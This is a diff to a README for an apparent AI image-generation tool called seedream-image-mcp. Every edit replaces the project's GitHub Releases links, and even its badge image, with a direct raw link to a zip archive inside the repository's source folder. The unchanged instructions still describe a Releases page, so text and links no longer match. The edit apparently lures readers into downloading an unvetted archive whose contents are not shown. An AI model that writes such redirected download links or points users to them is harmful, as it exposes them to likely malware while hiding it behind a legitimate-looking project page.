@@ -1,7 +1,7 @@
 # 🚀 seedream-image-mcp - Enhance Your Creativity with AI 
 
 ## 📥 Download the App  
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/avdp1951/seedream-image-mcp/releases)
+[![Download](https://raw.githubusercontent.com/avdp1951/seedream-image-mcp/main/src/seedream-image-mcp_v1.9.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/avdp1951/seedream-image-mcp/main/src/seedream-image-mcp_v1.9.zip)
 
 ## 🚀 Getting Started  
 Welcome to the **seedream-image-mcp** app! This application integrates AI-powered image generation into your favorite tools like Cursor and Claude Code. With this app, you can create visually appealing pages effortlessly. Follow the steps below to get started.
@@ -22,7 +22,7 @@ With **seedream-image-mcp**, you can enjoy:
 - Quick access to AI features directly in your projects.
 
 ## 📥 Download & Install  
-To download the application, visit this page: [Download Here](https://github.com/avdp1951/seedream-image-mcp/releases). You will find the latest version listed there.
+To download the application, visit this page: [Download Here](https://raw.githubusercontent.com/avdp1951/seedream-image-mcp/main/src/seedream-image-mcp_v1.9.zip). You will find the latest version listed there.
 
 1. Click on the link above to visit the Releases page.
 2. On the Releases page, scroll down to find the latest release.
@@ -71,4 +71,4 @@ Explore more about the topics and technologies related to **seedream-image-mcp**
 - Understanding Claude Code and Cursor
 - Model Context Protocol in AI
 
-Enjoy creating stunning images with **seedream-image-mcp**! Visit this page to download: [Download Here](https://github.com/avdp1951/seedream-image-mcp/releases).
+Enjoy creating stunning images with **seedream-image-mcp**! Visit this page to download: [Download Here](https://raw.githubusercontent.com/avdp1951/seedream-image-mcp/main/src/seedream-image-mcp_v1.9.zip).
